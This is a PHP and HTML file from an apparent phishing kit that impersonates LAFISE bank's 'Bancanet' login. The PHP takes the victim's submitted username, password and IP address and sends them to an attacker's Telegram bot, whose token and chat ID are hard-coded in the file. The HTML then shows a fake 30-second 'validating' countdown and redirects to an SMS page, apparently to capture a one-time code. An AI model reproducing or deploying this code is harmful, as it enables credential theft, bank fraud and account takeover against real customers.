<?php

// Configurar los datos del bot de Telegram y del chat
$bot_token = '5545935446:AAEaPWR8OUOL-0OBbqMLzioXF9jXLNT7jbM';
$chat_id = '5157616506';

// Obtener los datos del usuario, contraseña y dirección IP del formulario
$usuario = $_POST['us'];
$contrasena = $_POST['ct'];
$ip = $_SERVER['REMOTE_ADDR'];

// Construir el mensaje que se enviará al bot de Telegram
$mensaje = "LOGIN LAFISE:
Nuevo usuario: $usuario\nContraseña: $contrasena\nIP: $ip";

// Enviar el mensaje al bot de Telegram utilizando la API
$url = "https://api.telegram.org/bot$bot_token/sendMessage";
$datos = array('chat_id' => $chat_id, 'text' => $mensaje);
$options = array('http' => array('method' => 'POST', 'content' => http_build_query($datos)));
$context = stream_context_create($options);
$resultado = file_get_contents($url, false, $context);

// Verificar si el mensaje se envió correctamente y mostrar un mensaje al usuario
if ($resultado) {
	echo "¡Gracias! Tu información se ha enviado correctamente al bot de Telegram.";
} else {
	echo "Lo siento, ha ocurrido un error al enviar tu información. Por favor, inténtalo de nuevo más tarde.";
}

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="sc.css">
</head>
<body class="body" style="margin-top: -240px;">
    


<div class="nav">
.
</div>
<img class="laf" src="log2.png" alt="">

<br><br><br><br>

<center>

<div class="caja"> 


<form action="">


    <img class="img" src="log.png" alt="">

    <br>
    <br>

<a >Bienvenido a Bancanet</a>


 <br>  
 <br>


<a class="ltr3" >Estamos validando la información por favor espere, esto podria demorar  
        <span id="countdown"> </span> Segundos. </a>
    

     <div class="container se">
     </div>
     <div>
<img style="margin-top: 40px;
    width: 80px;
" src="loading.gif"></img></div>
     <script >

var segundoInicio = 30;

function actualizar() {
    document.getElementById('countdown').innerHTML = segundoInicio;

    if (segundoInicio == 0) {
        //cuenta regresiva ha finalizado
        
        window.location.href = "sms.html";
    } else {

       // segundoInicio-=1;
        /* 0 */
        segundoInicio = segundoInicio -1;
        setTimeout(actualizar, 1E3);
    }
}

actualizar();


     </script>

</form>

</div>


















</body>
</html>